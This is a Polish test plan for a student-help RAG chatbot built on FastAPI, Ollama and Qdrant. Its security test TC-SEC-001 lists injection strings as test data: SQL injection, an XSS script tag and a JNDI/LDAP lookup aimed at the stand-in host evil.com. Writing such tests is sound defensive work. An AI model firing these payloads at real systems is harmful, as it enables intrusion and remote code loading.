# Dokumentacja Przypadków Testowych - Agent1 Student Chatbot

**Projekt**: Chatbot dla Studentów WSB Merito  
**Komponent**: Agent1 Student (RAG System)  
**Data utworzenia**: 13 lutego 2026  
**Wersja**: 1.0

---

## Spis Treści

1. [Wprowadzenie](#wprowadzenie)
2. [Środowisko Testowe](#środowisko-testowe)
3. [Testy Jednostkowe](#testy-jednostkowe)
4. [Testy Integracyjne](#testy-integracyjne)
5. [Testy Funkcjonalne](#testy-funkcjonalne)
6. [Testy Wydajnościowe](#testy-wydajnościowe)
7. [Testy Walidacji Danych](#testy-walidacji-danych)
8. [Testy Bezpieczeństwa](#testy-bezpieczeństwa)
9. [Matryca Pokrycia Testów](#matryca-pokrycia-testów)

---

## Wprowadzenie

### Cel Dokumentu
Dokument opisuje wszystkie przypadki testowe dla systemu Agent1 Student - chatbota RAG (Retrieval-Augmented Generation) dla studentów WSB Merito.

### Zakres Testowania
- Endpoint API (`/api/chat`, `/api/tags`)
- Pipeline RAG (wyszukiwanie w bazie wiedzy)
- Integracja z Ollama (LLM)
- Integracja z Qdrant (baza wektorowa)
- System logowania
- Kategoryzacja zapytań

### Konwencje
- **[UNIT]** - Test jednostkowy (pojedyncza funkcja)
- **[INTEGRATION]** - Test integracyjny (kilka komponentów)
- **[FUNCTIONAL]** - Test funkcjonalny (end-to-end)
- **[PERFORMANCE]** - Test wydajnościowy
- **[SECURITY]** - Test bezpieczeństwa

---

## Środowisko Testowe

### Konfiguracja
```yaml
OS: Windows 11 + WSL2
Python: 3.11
Framework: FastAPI 0.104+
Docker: Latest
```

### Serwisy
```
Agent1_student:  http://localhost:8001 (Docker) / 8000 (wewnątrz)
Ollama:          http://localhost:11434
Qdrant:          http://localhost:6333
Open WebUI:      http://localhost:3000
Node-RED:        http://localhost:1880
```

### Modele
```
LLM:        mistral:7b (4.37 GB, Q4_K_M)
Embeddings: nomic-embed-text (274 MB, F16)
```

### Baza Wiedzy
```
Kolekcja:  agent1_student
Dokumenty: 198/203 załadowanych
Wymiar:    768 (nomic-embed-text)
```

---

## Testy Jednostkowe

### TC-UNIT-001: Test Funkcji search_knowledge_base()

**Priorytet**: KRYTYCZNY  
**Kategoria**: [UNIT] RAG Search  
**Funkcja**: `search_knowledge_base(query: str, limit: int)`

#### Opis
Test weryfikuje czy funkcja wyszukiwania w bazie wiedzy zwraca poprawne wyniki.

#### Warunki Wstępne
- Qdrant uruchomiony
- Kolekcja `agent1_student` załadowana
- Model embeddings dostępny

#### Kroki Testowe
1. Wywołaj `search_knowledge_base("stypendium rektora", limit=3)`
2. Sprawdź zwrócone dokumenty
3. Weryfikuj score każdego dokumentu

#### Dane Testowe
```python
query = "Jak ubiegać się o stypendium rektora?"
expected_category = "stypendia"
min_score = 0.7
```

#### Oczekiwany Wynik
```python
{
    "documents": [
        {
            "content": "...",
            "score": >= 0.7,
            "metadata": {...}
        }
    ],
    "count": 2-5,
    "category": "stypendia"
}
```

#### Kryteria Akceptacji
- PASS: Zwrócono >= 1 dokument z score >= 0.7
- PASS: Kategoria to "stypendia"
- FAIL: Brak dokumentów lub score < 0.7

---

### TC-UNIT-002: Test Funkcji categorize_query()

**Priorytet**: WYSOKI  
**Kategoria**: [UNIT] Kategoryzacja  
**Funkcja**: `categorize_query(query: str)`

#### Opis
Test weryfikuje poprawność automatycznej kategoryzacji zapytań.

#### Kroki Testowe
1. Przygotuj zapytania z różnych kategorii
2. Wywołaj `categorize_query()` dla każdego
3. Porównaj z oczekiwaną kategorią

#### Dane Testowe
```python
test_cases = [
    ("Jak uzyskać stypendium?", "stypendia"),
    ("Kiedy są egzaminy?", "egzaminy"),
    ("Gdzie jest BOS?", "bos"),
    ("Jak zmienić dane?", "dane_osobowe"),
    ("Urlop dziekański", "urlopy_zwolnienia"),
    ("Pytanie losowe", "unknown")
]
```

#### Oczekiwany Wynik
Każde zapytanie przypisane do właściwej kategorii zgodnie z tabelą.

#### Kryteria Akceptacji
- PASS: >= 80% zapytań poprawnie skategoryzowanych
- FAIL: < 80% poprawnych kategorii

---

### TC-UNIT-003: Test Funkcji extract_last_message()

**Priorytet**: ŚREDNI  
**Kategoria**: [UNIT] Parsowanie  
**Funkcja**: `extract_last_message(messages: list)`

#### Opis
Test weryfikuje ekstrakcję ostatniej wiadomości z konwersacji.

#### Dane Testowe
```python
messages = [
    {"role": "system", "content": "Jesteś chatbotem..."},
    {"role": "user", "content": "Pytanie 1"},
    {"role": "assistant", "content": "Odpowiedź 1"},
    {"role": "user", "content": "Pytanie 2"}
]
```

#### Oczekiwany Wynik
```python
"Pytanie 2"
```

#### Kryteria Akceptacji
- PASS: Zwrócono ostatnią wiadomość użytkownika
- FAIL: Zwrócono inną wiadomość lub None

---

### TC-UNIT-004: Test Funkcji enrich_prompt_with_context()

**Priorytet**: KRYTYCZNY  
**Kategoria**: [UNIT] RAG Pipeline  
**Funkcja**: `enrich_prompt_with_context(query: str, documents: list)`

#### Opis
Test weryfikuje wzbogacanie promptu o kontekst z bazy wiedzy.

#### Dane Testowe
```python
query = "Jak uzyskać stypendium?"
documents = [
    {
        "content": "Aby uzyskać stypendium rektora...",
        "score": 0.85
    },
    {
        "content": "Stypendium socjalne przyznawane...",
        "score": 0.78
    }
]
```

#### Oczekiwany Wynik
```
Prompt zawiera:
1. Zapytanie użytkownika
2. Kontekst z dokumentów
3. Instrukcję dla LLM
```

#### Kryteria Akceptacji
- PASS: Prompt zawiera query + oba dokumenty
- FAIL: Brakuje któregoś elementu

---

### TC-UNIT-005: Test QueryLogger.log_query()

**Priorytet**: WYSOKI  
**Kategoria**: [UNIT] Logowanie  
**Klasa**: `QueryLogger`

#### Opis
Test weryfikuje zapis zapytania do Qdrant.

#### Dane Testowe
```python
query = "Test query"
category = "stypendia"
user_id = "test_user_123"
```

#### Kroki Testowe
1. Wywołaj `query_logger.log_query(query, category, user_id)`
2. Sprawdź zwrócone UUID
3. Weryfikuj zapis w Qdrant collection `agent1_query_logs`

#### Oczekiwany Wynik
- UUID typu string
- Wpis w Qdrant z poprawnymi metadanymi

#### Kryteria Akceptacji
- PASS: Zwrócono UUID i wpis istnieje w Qdrant
- FAIL: Brak UUID lub błąd zapisu

---

### TC-UNIT-006: Test QueryLogger.log_qa_pair()

**Priorytet**: WYSOKI  
**Kategoria**: [UNIT] Logowanie  
**Klasa**: `QueryLogger`

#### Opis
Test weryfikuje zapis pary pytanie-odpowiedź do Qdrant.

#### Dane Testowe
```python
query = "Jak uzyskać stypendium?"
answer = "Aby uzyskać stypendium rektora..."
sources = ["doc1", "doc2"]
score = 0.85
category = "stypendia"
has_knowledge = True
```

#### Oczekiwany Wynik
Wpis w `agent1_qa_logs` z wszystkimi metadanymi.

#### Kryteria Akceptacji
- PASS: QA pair zapisana z poprawnym score i has_knowledge
- FAIL: Błąd zapisu lub brakujące dane

---

## Testy Integracyjne

### TC-INT-001: Test Integracji Agent → Qdrant

**Priorytet**: KRYTYCZNY  
**Kategoria**: [INTEGRATION] RAG Pipeline  
**Komponenty**: FastAPI, Qdrant Client, Embeddings

#### Opis
Test weryfikuje pełny przepływ wyszukiwania w bazie wiedzy.

#### Warunki Wstępne
- Qdrant uruchomiony i dostępny
- Kolekcja `agent1_student` załadowana
- Embedding model dostępny w Ollama

#### Kroki Testowe
1. Wyślij zapytanie tekstowe
2. Model embeduje zapytanie
3. Qdrant wykonuje wyszukiwanie wektorowe
4. Zwrócone dokumenty z score

#### Dane Testowe
```python
query = "Jakie są rodzaje stypendiów?"
```

#### Oczekiwany Wynik
```python
{
    "results": [
        {
            "id": "uuid",
            "score": 0.7-1.0,
            "payload": {
                "content": "...",
                "category": "stypendia",
                "filename": "..."
            }
        }
    ]
}
```

#### Metryki
- Czas odpowiedzi: < 2s
- Score: >= 0.7
- Liczba dokumentów: 1-5

#### Kryteria Akceptacji
- PASS: Qdrant zwraca wyniki w < 2s ze score >= 0.7
- FAIL: Timeout, błąd połączenia lub score < 0.7

---

### TC-INT-002: Test Integracji Agent → Ollama (LLM)

**Priorytet**: KRYTYCZNY  
**Kategoria**: [INTEGRATION] LLM  
**Komponenty**: FastAPI, Ollama API, ChatOllama

#### Opis
Test weryfikuje komunikację z modelem LLM Ollama.

#### Warunki Wstępne
- Ollama uruchomiony
- Model mistral:7b załadowany

#### Kroki Testowe
1. Przygotuj prompt z kontekstem
2. Wyślij do Ollama `/api/chat`
3. Odbierz streaming response
4. Zweryfikuj odpowiedź

#### Dane Testowe
```python
messages = [
    {"role": "system", "content": SYSTEM_PROMPT},
    {"role": "user", "content": "Enriched prompt..."}
]
model = "mistral:7b"
```

#### Oczekiwany Wynik
```python
{
    "message": {
        "role": "assistant",
        "content": "Odpowiedź w języku polskim..."
    }
}
```

#### Metryki
- Czas odpowiedzi: < 10s
- Język odpowiedzi: polski
- Długość: > 50 znaków

#### Kryteria Akceptacji
- PASS: Ollama zwraca odpowiedź w języku polskim w < 10s
- FAIL: Timeout, błąd modelu lub odpowiedź w innym języku

---

### TC-INT-003: Test Pełnego Pipeline RAG

**Priorytet**: KRYTYCZNY  
**Kategoria**: [INTEGRATION] End-to-End  
**Komponenty**: FastAPI → Qdrant → Ollama → Response

#### Opis
Test weryfikuje pełny przepływ RAG od zapytania do odpowiedzi.

#### Przepływ
```
User Query 
  → Categorize 
  → Embed (nomic-embed-text) 
  → Search Qdrant 
  → Enrich Prompt 
  → LLM (mistral:7b) 
  → Response 
  → Log to Qdrant
```

#### Dane Testowe
```python
query = "Jak ubiegać się o stypendium rektora?"
```

#### Oczekiwany Wynik
```python
{
    "message": {
        "role": "assistant",
        "content": "Aby ubiegać się o stypendium rektora..."
    },
    "sources": {
        "has_knowledge": True,
        "documents": [...],
        "score": 0.781,
        "category": "stypendia"
    }
}
```

#### Metryki
- Czas całkowity: < 15s
- RAG score: >= 0.7
- Logged to Qdrant: 2 wpisy (query + qa)

#### Kryteria Akceptacji
- PASS: Pełny pipeline wykonany w < 15s z poprawną odpowiedzią
- FAIL: Błąd w którymkolwiek etapie pipeline

---

### TC-INT-004: Test Logowania do Qdrant

**Priorytet**: WYSOKI  
**Kategoria**: [INTEGRATION] Logging  
**Komponenty**: FastAPI, QueryLogger, Qdrant

#### Opis
Test weryfikuje zapis logów zapytań i odpowiedzi do Qdrant.

#### Kroki Testowe
1. Wykonaj zapytanie przez `/api/chat`
2. Sprawdź wpis w `agent1_query_logs`
3. Sprawdź wpis w `agent1_qa_logs`

#### Oczekiwany Wynik
- 1 wpis w `agent1_query_logs` z query, category, timestamp
- 1 wpis w `agent1_qa_logs` z query, answer, score, sources

#### Kryteria Akceptacji
- PASS: Oba wpisy istnieją z poprawnymi danymi
- FAIL: Brak któregoś wpisu

---

## Testy Funkcjonalne

### TC-FUNC-001: Test Endpoint /api/chat (KB Present)

**Priorytet**: KRYTYCZNY  
**Kategoria**: [FUNCTIONAL] API  
**Endpoint**: `POST /api/chat`

#### Opis
Test weryfikuje endpoint dla zapytania, które ISTNIEJE w bazie wiedzy.

#### Request
```http
POST /api/chat HTTP/1.1
Content-Type: application/json

{
    "messages": [
        {
            "role": "user",
            "content": "Jak ubiegać się o stypendium rektora?"
        }
    ],
    "model": "mistral:7b"
}
```

#### Oczekiwana Odpowiedź
```json
{
    "message": {
        "role": "assistant",
        "content": "Aby ubiegać się o stypendium rektora, należy..."
    },
    "sources": {
        "has_knowledge": true,
        "documents": [
            {
                "content": "...",
                "score": 0.781
            }
        ],
        "score": 0.781,
        "category": "stypendia"
    }
}
```

#### Kryteria Akceptacji
- Status: 200 OK
- has_knowledge: true
- score: >= 0.7
- Odpowiedź w języku polskim

---

### TC-FUNC-002: Test Endpoint /api/chat (KB Absent)

**Priorytet**: WYSOKI  
**Kategoria**: [FUNCTIONAL] API  
**Endpoint**: `POST /api/chat`

#### Opis
Test weryfikuje endpoint dla zapytania, które NIE ISTNIEJE w bazie wiedzy.

#### Request
```http
POST /api/chat HTTP/1.1
Content-Type: application/json

{
    "messages": [
        {
            "role": "user",
            "content": "Co to jest sens życia i dlaczego istnieją czarne dziury?"
        }
    ],
    "model": "mistral:7b"
}
```

#### Oczekiwana Odpowiedź
```json
{
    "message": {
        "role": "assistant",
        "content": "Nie mam informacji na ten temat. Skontaktuj się z Biurem Obsługi Studenta."
    },
    "sources": {
        "has_knowledge": true/false,
        "documents": [...],
        "score": < 0.7,
        "category": "unknown"
    }
}
```

#### Kryteria Akceptacji
- Status: 200 OK
- Odpowiedź zawiera "Nie mam informacji" lub podobne
- LLM nie halucynuje odpowiedzi

---

### TC-FUNC-003: Test Endpoint /api/tags

**Priorytet**: KRYTYCZNY  
**Kategoria**: [FUNCTIONAL] API  
**Endpoint**: `GET /api/tags`

#### Opis
Test weryfikuje endpoint zwracający listę dostępnych modeli (dla Open WebUI).

#### Request
```http
GET /api/tags HTTP/1.1
```

#### Oczekiwana Odpowiedź
```json
{
    "models": [
        {
            "name": "mistral:7b",
            "model": "mistral:7b",
            "size": 4372824384,
            "details": {
                "family": "llama",
                "parameter_size": "7.2B"
            }
        },
        {
            "name": "nomic-embed-text:latest",
            "model": "nomic-embed-text:latest",
            "size": 274302450
        }
    ]
}
```

#### Kryteria Akceptacji
- Status: 200 OK
- Lista zawiera >= 2 modele (mistral + nomic)
- Każdy model ma name, size, details

---

### TC-FUNC-004: Test Kategoryzacji Automatycznej

**Priorytet**: WYSOKI  
**Kategoria**: [FUNCTIONAL] Kategoryzacja

#### Opis
Test weryfikuje automatyczną kategoryzację różnych typów zapytań.

#### Dane Testowe
| Zapytanie | Oczekiwana Kategoria |
|-----------|---------------------|
| "Jak uzyskać stypendium?" | stypendia |
| "Kiedy jest egzamin?" | egzaminy |
| "Gdzie jest dziekanat?" | bos |
| "Jak zmienić nazwisko?" | dane_osobowe |
| "Urlop dziekański" | urlopy_zwolnienia |
| "Pytanie losowe xyz" | unknown |

#### Kryteria Akceptacji
- PASS: >= 5/6 zapytań poprawnie skategoryzowanych
- FAIL: < 5/6 poprawnych

---

### TC-FUNC-005: Test Wielokrotnych Zapytań w Konwersacji

**Priorytet**: ŚREDNI  
**Kategoria**: [FUNCTIONAL] Konwersacja

#### Opis
Test weryfikuje zachowanie kontekstu w wieloetapowej konwersacji.

#### Kroki
1. Zapytanie 1: "Jakie są stypendia?"
2. Zapytanie 2: "Jak się o nie ubiegać?" (kontekst: stypendia)
3. Zapytanie 3: "Kiedy jest termin?" (kontekst: stypendia)

#### Oczekiwany Wynik
System rozumie kontekst poprzednich zapytań.

#### Kryteria Akceptacji
- PASS: Odpowiedzi są spójne i kontekstowe
- FAIL: System traci kontekst

---

## Testy Wydajnościowe

### TC-PERF-001: Test Response Time dla /api/chat

**Priorytet**: WYSOKI  
**Kategoria**: [PERFORMANCE] Latency

#### Opis
Test weryfikuje czas odpowiedzi endpointu RAG.

#### Metryki
```
Embedding:        < 1s
Qdrant Search:    < 1s
LLM Generation:   < 8s
Total:            < 15s
```

#### Dane Testowe
- 10 zapytań różnej długości (10-100 słów)

#### Kryteria Akceptacji
- PASS: 90% zapytań w < 15s
- WARNING: 80-90% w < 15s
- FAIL: < 80% w < 15s

---

### TC-PERF-002: Test Concurrent Requests

**Priorytet**: ŚREDNI  
**Kategoria**: [PERFORMANCE] Concurrency

#### Opis
Test weryfikuje wydajność przy jednoczesnych zapytaniach.

#### Parametry
```
Concurrent Users: 5, 10, 20
Requests per User: 3
Total Requests: 15, 30, 60
```

#### Metryki
- Średni response time
- P95 response time
- Success rate

#### Kryteria Akceptacji
- PASS: Success rate >= 95% dla 10 concurrent users
- FAIL: Success rate < 95%

---

### TC-PERF-003: Test Memory Usage

**Priorytet**: ŚREDNI  
**Kategoria**: [PERFORMANCE] Resources

#### Opis
Test weryfikuje zużycie pamięci podczas pracy.

#### Metryki
```
Idle Memory:          < 500 MB
Under Load (10 req): < 1 GB
Peak Memory:          < 2 GB
```

#### Kryteria Akceptacji
- PASS: Peak memory < 2 GB
- FAIL: Peak memory >= 2 GB lub memory leak

---

### TC-PERF-004: Test Qdrant Query Performance

**Priorytet**: WYSOKI  
**Kategoria**: [PERFORMANCE] Database

#### Opis
Test weryfikuje szybkość wyszukiwania wektorowego w Qdrant.

#### Parametry
```
Collection Size: 198 wektorów
Query Vector Dim: 768
Limit: 3, 5, 10
```

#### Metryki
- Query time < 500ms

#### Kryteria Akceptacji
- PASS: Wszystkie queries < 500ms
- FAIL: Średni czas > 500ms

---

## Testy Walidacji Danych

### TC-VAL-001: Test Walidacji Embeddings w Qdrant

**Priorytet**: KRYTYCZNY  
**Kategoria**: [VALIDATION] Data Quality

#### Opis
Test weryfikuje poprawność wektorów w bazie Qdrant.

#### Sprawdzenia
1. Wszystkie wektory mają wymiar 768
2. Brak wektorów NULL/NaN
3. Wektory są znormalizowane
4. Metadane są kompletne

#### Kryteria Akceptacji
- PASS: 100% wektorów spełnia wszystkie warunki
- FAIL: Jakikolwiek wektor niepoprawny

---

### TC-VAL-002: Test Walidacji Kategorii

**Priorytet**: WYSOKI  
**Kategoria**: [VALIDATION] Business Logic

#### Opis
Test weryfikuje, czy wszystkie dokumenty mają przypisane kategorie.

#### Dozwolone Kategorie
```
- stypendia
- egzaminy
- rekrutacja
- dane_osobowe
- urlopy_zwolnienia
- bos
- unknown
```

#### Kryteria Akceptacji
- PASS: Wszystkie dokumenty mają kategorię z listy
- FAIL: Kategoria poza listą lub NULL

---

### TC-VAL-003: Test Kompletności Metadanych

**Priorytet**: ŚREDNI  
**Kategoria**: [VALIDATION] Metadata

#### Opis
Test weryfikuje kompletność metadanych dokumentów.

#### Wymagane Pola
```
- content (nie może być puste)
- category
- filename
- timestamp
```

#### Kryteria Akceptacji
- PASS: >= 95% dokumentów ma wszystkie pola
- FAIL: < 95% kompletnych

---

## Testy Bezpieczeństwa

### TC-SEC-001: Test SQL/NoSQL Injection

**Priorytet**: KRYTYCZNY  
**Kategoria**: [SECURITY] Injection

#### Opis
Test weryfikuje odporność na ataki injection.

#### Dane Testowe
```python
queries = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "<script>alert('XSS')</script>",
    "${jndi:ldap://evil.com/a}"
]
```

#### Kryteria Akceptacji
- PASS: Wszystkie niebezpieczne znaki są escapowane
- FAIL: Wykonanie niezamierzonego kodu

---

### TC-SEC-002: Test Rate Limiting

**Priorytet**: WYSOKI  
**Kategoria**: [SECURITY] DoS Protection

#### Opis
Test weryfikuje ochronę przed nadmiernym ruchem.

#### Parametry
```
Max Requests: 100/min per IP
Burst: 10/s
```

#### Kryteria Akceptacji
- PASS: Nadmiarowe requesty zwracają 429 Too Many Requests
- FAIL: Brak rate limitingu

---

### TC-SEC-003: Test Input Validation

**Priorytet**: WYSOKI  
**Kategoria**: [SECURITY] Input Validation

#### Opis
Test weryfikuje walidację danych wejściowych.

#### Sprawdzenia
- Max długość query: 2000 znaków
- Dozwolone znaki: alfanumeryczne + podstawowa interpunkcja
- Brak binary data

#### Kryteria Akceptacji
- PASS: Niepoprawne dane zwracają 400 Bad Request
- FAIL: Przyjęcie niepoprawnych danych

---

## Matryca Pokrycia Testów

### Pokrycie Funkcjonalności

| Funkcjonalność | Unit | Integration | Functional | Performance | Security |
|----------------|------|-------------|------------|-------------|----------|
| RAG Search | TC-UNIT-001 | TC-INT-001 | TC-FUNC-001 | TC-PERF-004 | - |
| Kategoryzacja | TC-UNIT-002 | - | TC-FUNC-004 | - | - |
| Logowanie | TC-UNIT-005, 006 | TC-INT-004 | - | - | - |
| API /api/chat | - | TC-INT-003 | TC-FUNC-001, 002 | TC-PERF-001 | TC-SEC-001 |
| API /api/tags | - | - | TC-FUNC-003 | - | - |
| LLM Integration | TC-UNIT-004 | TC-INT-002 | - | - | - |
| Qdrant Integration | - | TC-INT-001 | - | TC-PERF-004 | - |

### Pokrycie Priorytetów

| Priorytet | Liczba Testów | Procent |
|-----------|---------------|---------|
| KRYTYCZNY | 12 | 40% |
| WYSOKI | 11 | 37% |
| ŚREDNI | 7 | 23% |

### Pokrycie Kategorii

| Kategoria | Liczba Testów |
|-----------|---------------|
| [UNIT] | 6 |
| [INTEGRATION] | 4 |
| [FUNCTIONAL] | 5 |
| [PERFORMANCE] | 4 |
| [VALIDATION] | 3 |
| [SECURITY] | 3 |
| **TOTAL** | **25** |

---

## Harmonogram Wykonania

### Sprint 1 - Testy Jednostkowe (Tydzień 1)
- TC-UNIT-001 do TC-UNIT-006
- Cel: 100% pokrycia funkcji

### Sprint 2 - Testy Integracyjne (Tydzień 2)
- TC-INT-001 do TC-INT-004
- Cel: Weryfikacja komunikacji między komponentami

### Sprint 3 - Testy Funkcjonalne (Tydzień 3)
- TC-FUNC-001 do TC-FUNC-005
- Cel: End-to-end validation

### Sprint 4 - Testy Wydajnościowe i Bezpieczeństwa (Tydzień 4)
- TC-PERF-001 do TC-PERF-004
- TC-SEC-001 do TC-SEC-003
- TC-VAL-001 do TC-VAL-003
- Cel: Production readiness

---

## Narzędzia Testowe

### Frameworki
```bash
pytest              # Unit & Integration tests
pytest-cov          # Code coverage
pytest-asyncio      # Async tests
locust              # Performance testing
```

### Biblioteki
```bash
requests            # HTTP testing
httpx               # Async HTTP
faker               # Test data generation
```

### Monitoring
```bash
docker logs         # Container logs
Qdrant Dashboard    # Vector DB monitoring
Ollama logs         # LLM monitoring
```

---

## Metryki Sukcesu

### Cel Projektu
- **Code Coverage**: >= 80%
- **Pass Rate**: >= 95%
- **Performance**: P95 < 15s
- **Security**: 0 krytycznych luk

### Raportowanie
- Testy wykonywane przed każdym merge do main
- Raport generowany automatycznie (pytest-html)
- Critical failures blokują deployment

---

**Dokument zaktualizowany**: 13 lutego 2026  
**Wersja**: 1.0  
**Status**: AKTYWNY


## Maintainers
- Adam Siehen (adamsiehen)
- Patryk Boguski (ptrBoguski)
- Miko�aj Sykucki (zybert)
- Oskar Jurgielaniec (oskarju1)
- Pawe� Ponikowski (pponikowski)
